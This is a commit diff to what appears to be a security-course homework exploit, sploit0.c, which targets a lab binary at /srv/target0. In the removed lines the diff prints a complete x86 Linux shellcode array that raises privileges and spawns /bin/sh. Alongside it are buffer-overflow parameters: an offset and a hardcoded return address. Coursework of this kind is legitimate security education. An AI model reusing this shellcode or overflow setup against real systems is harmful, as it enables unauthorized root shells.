4c14069ad413015e3d9e687bdf7a6f5812538985
justinhalford <justinhalford@gmail.com>
2024-05-08 12:13:36 -0400

    may 7

--- cs5435-hw4/sploits/sploit0.c
+++ cs5435-hw4/sploits/sploit0.c
@@ -3,17 +3,11 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <shellcode.h>
 
 #define TARGET "/srv/target0"
 
-static char shellcode[] = 
-  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
-  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
-  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
-  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
-
 const int OFFSET = 408;
-const int NOP_COUNT = 200;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
 const char* RETURN_ADDRESS = 0xffffdb2c;
 
